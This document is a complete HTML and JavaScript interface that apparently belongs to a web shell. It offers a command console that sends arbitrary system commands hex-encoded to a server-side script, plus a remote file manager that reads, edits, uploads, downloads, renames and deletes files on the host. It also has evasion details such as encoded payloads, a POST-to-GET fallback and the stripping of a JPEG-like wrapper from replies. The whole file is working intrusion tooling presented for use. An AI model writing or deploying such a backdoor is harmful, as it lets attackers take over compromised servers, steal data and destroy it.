<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>console</title>
<style>
  :root { color-scheme: dark; }
  * { box-sizing: border-box; }
  body { font: 13px/1.45 ui-monospace, Consolas, monospace;
         background:#0e0e10; color:#d8d8d8; margin:0; padding:18px; }
  h1 { font-size:14px; font-weight:600; margin:0 0 12px; color:#9ad; letter-spacing:.5px; }
  h1 span { font-weight:400; font-size:11px; color:#666; margin-left:8px; }
  .row { display:flex; gap:8px; margin-bottom:10px; align-items:center; flex-wrap:wrap; }
  input,select,button,textarea {
      font:inherit; background:#18181b; color:#e6e6e6;
      border:1px solid #2a2a30; border-radius:6px; padding:7px 10px; outline:none; }
  input:focus,select:focus,textarea:focus { border-color:#4a6fa5; }
  button { cursor:pointer; background:#1f2937; }
  button:hover { background:#273449; }
  button:active { transform:translateY(1px); }
  #out { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
         color:#7ee787; padding:12px; width:100%; min-height:160px; max-height:50vh;
         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px;
         font-family:ui-monospace,Consolas,monospace; resize:vertical; outline:none; }
  .meta { color:#666; font-size:11.5px; }
  hr { border:0; border-top:1px solid #1e1e24; margin:20px 0; }

  #c { flex:1 1 520px; min-width:300px; }

  #fmPathRow .path-wrap { flex:1 1 100%; display:flex; gap:8px; }
  #fmPathRow .path-wrap #fmPath { flex:1 1 auto; min-width:0; }

  #fmWrap { max-height:55vh; overflow:auto; border:1px solid #1e1e24; border-radius:6px; }
  #fmTable { width:100%; border-collapse:collapse; table-layout:fixed; font-size:12.5px; }
  #fmTable th, #fmTable td { text-align:left; padding:6px 8px;
      border-bottom:1px solid #1e1e24; overflow:hidden; text-overflow:ellipsis; }
  #fmTable th { color:#9ad; font-weight:600; background:#141418; position:sticky; top:0; z-index:1; }
  #fmTable th.actions { text-align:right; padding-right:10px; }
  #fmTable tr:hover td { background:#14141a; }
  #fmTable td.name { white-space:nowrap; }
  #fmTable td.actions { white-space:nowrap; padding-right:10px; text-align:right; }
  #fmTable td.actions button { padding:3px 7px; font-size:11.5px; margin-right:4px; }
  #fmTable td.actions button:last-child { margin-right:0; }
  #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
  #fmTable a.fmLink:hover { text-decoration:underline; }

  #modal { position:fixed; inset:0; background:rgba(0,0,0,.65);
           display:none; align-items:center; justify-content:center; z-index:10; }
  #modal.open { display:flex; }
  .modal-box { background:#141418; border:1px solid #2a2a30; border-radius:8px;
           width:min(900px, 92vw); height:min(80vh, 720px);
           display:flex; flex-direction:column; padding:12px; }
  .modal-head { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-bottom:8px; color:#9ad; }
  .modal-foot { display:flex; align-items:center; justify-content:space-between;
           gap:8px; margin-top:8px; }
  #modalText { flex:1; width:100%; background:#08080a; color:#7ee787;
           border:1px solid #1e1e24; border-radius:6px; padding:10px;
           font:12.5px/1.4 ui-monospace, Consolas, monospace; resize:none; outline:none; }
  #modalText[readonly] { color:#cfcfcf; }
</style>
<h1>console</h1>
<div class="row">
  <select id="fn">
    <option value="">auto</option>
  </select>
  <input id="c" placeholder="command (id / whoami / dir / uname -a)" autofocus>
  <button onclick="run()">run</button>
  <button onclick="info()">server info</button>
  <button onclick="document.getElementById('out').value='';">clear</button>
</div>
<textarea id="out" readonly>loading...</textarea>
<div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>
<hr>

<h1>files <span id="fmMode"></span></h1>
<div class="row" id="fmPathRow">
  <button onclick="fmMkdir()">new folder</button>
  <button onclick="fmNewFile()">new file</button>
  <button onclick="fmUpload()">upload</button>
  <div class="path-wrap">
    <input id="fmPath" placeholder="/path/to/dir">
    <button onclick="fmGo()">go</button>
    <button onclick="fmRefresh()">refresh</button>
  </div>
</div>

<div class="row">
  <button onclick="fmDownloadSelected()">download selected</button>
  <button onclick="fmDeleteSelected()">delete selected</button>
  <span id="fmStatus" class="meta"></span>
</div>

<div id="fmWrap">
<table id="fmTable">
  <colgroup>
    <col style="width:34px">
    <col>
    <col style="width:60px">
    <col style="width:80px">
    <col style="width:150px">
    <col style="width:220px">
  </colgroup>
  <thead>
    <tr>
      <th><input type="checkbox" id="fmAll" onchange="fmToggleAll(this)"></th>
      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th class="actions">Actions <button onclick="fmUp()">up</button> <button onclick="fmHome()">cwd</button></th>
    </tr>
  </thead>
  <tbody></tbody>
</table>
</div>

<div id="modal">
  <div class="modal-box">
    <div class="modal-head">
      <span id="modalTitle">edit</span>
      <button onclick="modalClose()">x</button>
    </div>
    <textarea id="modalText" spellcheck="false"></textarea>
    <div class="modal-foot">
      <span id="modalStatus" class="meta"></span>
      <div id="modalActions"></div>
    </div>
  </div>
</div>

<script>
const $ = s => document.querySelector(s);
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;')
  .replace(/>/g,'&gt;').replace(/"/g,'&quot;');
function hex(s) {
  var b, i, h = '';
  if (typeof TextEncoder !== 'undefined') b = new TextEncoder().encode(s);
  else {
    b = [];
    var u = unescape(encodeURIComponent(String(s)));
    for (i = 0; i < u.length; i++) b.push(u.charCodeAt(i));
  }
  for (i = 0; i < b.length; i++) h += ('0' + (b[i] & 255).toString(16)).slice(-2);
  return h;
}
function selfUrl() {
  var p = String(location.pathname || '/');
  p = p.replace(/\/+/g, '/');
  if (!p || p.charAt(0) !== '/') p = '/' + p;
  return p;
}
function u8ToStr(u8) {
  var out = '', i = 0, n = 8192;
  for (; i < u8.length; i += n) {
    out += String.fromCharCode.apply(null, Array.prototype.slice.call(u8.subarray(i, Math.min(i + n, u8.length))));
  }
  return out;
}
function unwrapBuf(buf) {
  if (!buf || buf.length < 4) return buf;
  if (buf[0] === 0xff && buf[1] === 0xd8) {
    return buf.length > 19 ? buf.subarray(19) : buf;
  }
  return buf;
}
function cleanText(t) {
  if (t == null) return '';
  t = String(t);
  var m = t.indexOf('PHP_VERSION');
  if (m >= 0) return t.slice(m);
  var a = t.indexOf('{');
  var d = t.toLowerCase().indexOf('<!doctype');
  var cut = -1;
  if (a >= 0) cut = a;
  if (d >= 0 && (cut < 0 || d < cut)) cut = d;
  if (cut > 0) return t.slice(cut);
  return t;
}
function parseJsonText(t) {
  if (t == null) return { ok: false, error: 'empty' };
  t = String(t);
  var n = 0;
  while (n < t.length && t.charCodeAt(n) < 32) n++;
  t = t.slice(n);
  if (t.charAt(0) === '<') return { ok: false, error: 'not json' };
  var a = t.indexOf('{');
  if (a < 0) return { ok: false, error: 'not json' };
  t = t.slice(a);
  try { return JSON.parse(t); }
  catch (e1) {
    var z = t.lastIndexOf('}');
    if (z > 0) {
      try { return JSON.parse(t.slice(0, z + 1)); }
      catch (e2) {}
    }
    return { ok: false, error: 'not json' };
  }
}
function xhrSend(method, url, body) {
  return new Promise(function(resolve, reject) {
    var x = new XMLHttpRequest();
    x.open(method, url, true);
    x.timeout = 120000;
    x.responseType = 'arraybuffer';
    if (method === 'POST') {
      x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      x.setRequestHeader('Cache-Control', 'no-store');
    }
    x.onload = function() {
      resolve({
        ok: x.status >= 200 && x.status < 300,
        status: x.status,
        buf: unwrapBuf(new Uint8Array(x.response || 0)),
        headers: { get: function(n) { return x.getResponseHeader(n); } }
      });
    };
    x.onerror = function() { reject(new TypeError('NetworkError when attempting to fetch resource.')); };
    x.ontimeout = function() { var e = new Error('timeout'); e.name = 'AbortError'; reject(e); };
    x.send(method === 'GET' ? null : body);
  });
}
function postRaw(body) {
  var base = selfUrl();
  var t = (new Date()).getTime();
  return xhrSend('POST', base + '?t=' + t, body).then(function(r) {
    if (r.buf && r.buf.length && r.buf[0] === 0x3c && body && body.indexOf('u=') < 0 && body.length < 2000) {
      return xhrSend('GET', base + '?' + body + '&t=' + t, null);
    }
    return r;
  });
}
async function callConsole(payload) {
  var r = await postRaw('r=' + payload);
  return cleanText(u8ToStr(r.buf));
}
async function run() {
  const cmd = $('#c').value;
  if (!cmd) return;
  const fn = $('#fn').value;
  const payload = fn ? hex(fn) + ':' + hex(cmd) : hex(cmd);
  $('#out').value = '...';
  try {
    const t = await callConsole(payload);
    $('#out').value = t || '(empty)';
  } catch (e) {
    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}
async function info() {
  $('#out').value = 'loading...';
  try {
    const r = await fmCall('debug', {});
    $('#out').value = cleanText(u8ToStr(r.buf));
  } catch (e) {
    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}

async function infoShort() {
  try {
    const r = await fmJson('info');
    if (!r.ok) return;
    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
  } catch (e) {}
}
$('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
$('#fmPath').addEventListener('keydown', e => { if (e.key === 'Enter') fmGo(); });

let fmCwd = '';
let fmEntries = [];

async function fmCall(op, params) {
  const payload = hex(JSON.stringify(Object.assign({ op: op }, params || {})));
  return await postRaw('f=' + payload);
}
async function fmJson(op, params) {
  try {
    const r = await fmCall(op, params);
    if (!r.buf || !r.buf.length) return { ok: false, error: 'empty' };
    return parseJsonText(u8ToStr(r.buf));
  } catch (e) {
    return { ok: false, error: e.name === 'AbortError' ? 'timeout' : 'request failed' };
  }
}
function fmtSize(n) {
  if (n < 1024) return n + ' B';
  if (n < 1048576) return (n/1024).toFixed(1) + ' K';
  if (n < 1073741824) return (n/1048576).toFixed(1) + ' M';
  return (n/1073741824).toFixed(1) + ' G';
}
function pathJoin(base, name) {
  const sep = (base.indexOf('\\') !== -1 && base.indexOf('/') === -1) ? '\\' : '/';
  return base.replace(/[\\\/]+$/,'') + sep + name;
}
function pathParent(p) {
  p = p.replace(/[\\\/]+$/, '');
  if (/^[A-Za-z]:$/.test(p)) return p + '\\';
  const i = Math.max(p.lastIndexOf('/'), p.lastIndexOf('\\'));
  if (i <= 0) return p.slice(0, 1) || '/';
  return p.slice(0, i);
}

function fmRender() {
  const tb = $('#fmTable tbody');
  tb.innerHTML = '';
  for (const e of fmEntries) {
    const full = pathJoin(fmCwd, e.name);
    const isDir = e.type === 'dir';
    const tr = document.createElement('tr');
    tr.dataset.path = full;
    const nameCell = isDir
      ? '<a class="fmLink">' + esc(e.name) + '/</a>'
      : esc(e.name);
    const acts = (isDir ? '<button data-act="dl">dl</button>' :
        '<button data-act="view">view</button>' +
        '<button data-act="edit">edit</button>' +
        '<button data-act="dl">dl</button>') +
      '<button data-act="rn">rn</button>' +
      '<button data-act="rm">rm</button>';
    tr.innerHTML =
      '<td><input type="checkbox" class="fmSel"></td>' +
      '<td class="name">' + nameCell + '</td>' +
      '<td>' + esc(e.type) + '</td>' +
      '<td>' + (isDir ? '-' : fmtSize(e.size)) + '</td>' +
      '<td>' + esc(e.mtime) + '</td>' +
      '<td class="actions">' + acts + '</td>';
    tb.appendChild(tr);
  }
  $('#fmPath').value = fmCwd;
}

async function fmLoad(path) {
  $('#fmStatus').textContent = 'loading...';
  const r = await fmJson('list', { path });
  if (!r.ok) { $('#fmStatus').textContent = 'error: ' + (r.error || '?'); return; }
  fmCwd = r.path;
  fmEntries = r.entries;
  $('#fmMode').textContent = '[mode: ' + r.mode + ']';
  fmRender();
  $('#fmStatus').textContent = fmEntries.length + ' item(s)';
}

function fmGo() { fmLoad($('#fmPath').value); }
function fmRefresh() { fmLoad(fmCwd); }
function fmUp() { fmLoad(pathParent(fmCwd)); }

function fnSummary(r) {
  const list = [];
  if (r.functions) for (const k in r.functions) if (r.functions[k]) list.push(k);
  return list.length ? list.join(',') : '(none)';
}

async function fmHome() {
  const r = await fmJson('info');
  if (!r.ok) { $('#fmStatus').textContent = 'error: ' + (r.error || '?'); return; }
  infoShort();
  fmLoad(r.cwd);
}
async function fmInit() {
  const r = await fmJson('info');
  if (!r.ok) { $('#fmStatus').textContent = 'init failed: ' + (r.error || '?'); return; }
  fmLoad(r.cwd);
}

function fmToggleAll(cb) {
  document.querySelectorAll('.fmSel').forEach(x => x.checked = cb.checked);
}
function fmSelected() {
  return [...document.querySelectorAll('#fmTable tbody tr')]
    .filter(tr => tr.querySelector('.fmSel') && tr.querySelector('.fmSel').checked)
    .map(tr => tr.dataset.path);
}

$('#fmTable tbody').addEventListener('click', e => {
  const link = e.target.closest('a.fmLink');
  if (link) {
    const tr = link.closest('tr');
    if (tr) fmLoad(tr.dataset.path);
    return;
  }
  const btn = e.target.closest('button[data-act]');
  if (!btn) return;
  const tr = btn.closest('tr');
  if (!tr) return;
  const path = tr.dataset.path;
  const act = btn.dataset.act;
  if (act === 'view') fmView(path);
  else if (act === 'edit') fmEdit(path);
  else if (act === 'dl') fmDownload(path);
  else if (act === 'rn') fmRename(path);
  else if (act === 'rm') fmDeleteOne(path);
});

async function fmView(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'view: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = true;
  $('#modalStatus').textContent = r.size + ' bytes' + (r.binary ? ' (binary)' : '');
  $('#modalActions').innerHTML = '';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'view';
}

async function fmEdit(path) {
  const r = await fmJson('read', { path });
  if (!r.ok) { alert('read failed: ' + r.error); return; }
  $('#modalTitle').textContent = 'edit: ' + path;
  $('#modalText').value = r.content;
  $('#modalText').readOnly = false;
  $('#modalStatus').textContent = r.size + ' bytes';
  $('#modalActions').innerHTML = '<button onclick="modalSave()">save</button>';
  $('#modal').classList.add('open');
  $('#modal').dataset.path = path;
  $('#modal').dataset.mode = 'edit';
}

async function modalSave() {
  if ($('#modal').dataset.mode !== 'edit') { modalClose(); return; }
  const path = $('#modal').dataset.path;
  const content = $('#modalText').value;
  $('#modalStatus').textContent = 'saving...';
  const r = await fmJson('write', { path, content });
  if (r.ok) {
    $('#modalStatus').textContent = 'saved ' + r.bytes + ' bytes';
    setTimeout(modalClose, 400);
  } else {
    $('#modalStatus').textContent = 'error: ' + r.error;
  }
}

function modalClose() {
  $('#modal').classList.remove('open');
  $('#modal').dataset.path = '';
  $('#modal').dataset.mode = '';
  $('#modalActions').innerHTML = '';
}

async function fmRename(path) {
  const oldName = path.split(/[\\\/]/).pop();
  const newName = prompt('rename to:', oldName);
  if (!newName || newName === oldName) return;
  const to = path.slice(0, path.length - oldName.length) + newName;
  const r = await fmJson('rename', { from: path, to });
  if (!r.ok) alert('rename failed: ' + r.error);
  fmRefresh();
}

async function fmDeleteOne(path) {
  if (!confirm('delete:\n' + path)) return;
  const r = await fmJson('delete', { paths: [path] });
  if (!r.ok) alert('delete failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmDownload(path) {
  const r = await fmCall('download', { path });
  if (!r.ok) { alert('download failed'); return; }
  const blob = new Blob([r.buf]);
  const cd = r.headers.get('Content-Disposition') || '';
  let name = path.split(/[\\\/]/).pop();
  const m = cd.match(/filename="([^"]+)"/);
  if (m) name = m[1];
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = name;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 2000);
}

async function fmDownloadSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  for (const p of sel) {
    await fmDownload(p);
    await new Promise(r => setTimeout(r, 300));
  }
}

async function fmDeleteSelected() {
  const sel = fmSelected();
  if (!sel.length) { alert('nothing selected'); return; }
  if (!confirm('delete ' + sel.length + ' item(s)?')) return;
  const r = await fmJson('delete', { paths: sel });
  if (!r.ok) alert('some failed: ' + JSON.stringify(r.failed));
  fmRefresh();
}

async function fmMkdir() {
  const name = prompt('new folder name:');
  if (!name) return;
  const r = await fmJson('mkdir', { path: pathJoin(fmCwd, name) });
  if (!r.ok) alert('mkdir failed: ' + r.error);
  fmRefresh();
}

async function fmNewFile() {
  const name = prompt('new file name:');
  if (!name) return;
  const r = await fmJson('write', { path: pathJoin(fmCwd, name), content: '' });
  if (!r.ok) alert('create failed: ' + r.error);
  fmRefresh();
}

async function fmUpload() {
  const inp = document.createElement('input');
  inp.type = 'file';
  inp.onchange = async () => {
    const f = inp.files && inp.files[0];
    if (!f) return;
    $('#fmStatus').textContent = 'uploading ' + f.name + ' (' + fmtSize(f.size) + ')...';
    const buf = new Uint8Array(await f.arrayBuffer());
    let h = '';
    const chunk = 8192;
    for (let i = 0; i < buf.length; i += chunk) {
      h += Array.prototype.map.call(buf.subarray(i, i + chunk), b => b.toString(16).padStart(2,'0')).join('');
    }
    const meta = hex(JSON.stringify({ op: 'upload', path: pathJoin(fmCwd, f.name) }));
    try {
      const r = await postRaw('f=' + meta + '&u=' + h);
      const j = parseJsonText(u8ToStr(r.buf));
      if (!j.ok) {
        $('#fmStatus').textContent = '✗ ' + f.name + ': ' + j.error;
        $('#fmStatus').style.color = '#f97583';
      } else {
        $('#fmStatus').textContent = '✓ ' + f.name + ' (' + fmtSize(j.bytes) + ')';
        $('#fmStatus').style.color = '#7ee787';
      }
      setTimeout(() => {
        $('#fmStatus').textContent = '';
        $('#fmStatus').style.color = '';
      }, 3000);
    } catch (e) {
      $('#fmStatus').textContent = '✗ ' + f.name + ': ' + (e.name === 'AbortError' ? 'timeout' : e.message);
      $('#fmStatus').style.color = '#f97583';
      setTimeout(() => {
        $('#fmStatus').textContent = '';
        $('#fmStatus').style.color = '';
      }, 3000);
    }
    fmRefresh();
  };
  inp.click();
}

async function boot() {
  $('#out').value = 'loading...';
  try {
    const r = await fmCall('debug', {});
    $('#out').value = cleanText(u8ToStr(r.buf));
  } catch (e) {
    $('#out').value = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
  }
}

boot();
fmInit();
</script>
</html>
